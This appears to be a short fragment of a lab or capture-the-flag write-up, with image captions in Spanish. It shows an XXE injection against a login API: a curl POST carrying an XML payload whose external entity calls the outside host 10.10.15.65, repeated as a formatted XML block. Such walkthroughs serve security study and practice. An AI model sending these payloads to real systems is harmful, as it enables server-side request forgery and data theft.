____

![Captura](../../../assets/images/reference/84d129dda0f1a17cdecb.png)

```bash
curl -X POST http://$IP:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://10.10.15.65"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [
  <!ENTITY somename SYSTEM "http://10.10.15.65">
]>
<root>
  <email>&somename;</email>
  <password>P@ssw0rd123</password>
</root>
```

![Captura](../../../assets/images/reference/f42f26ebd88602d3b5a0.png)
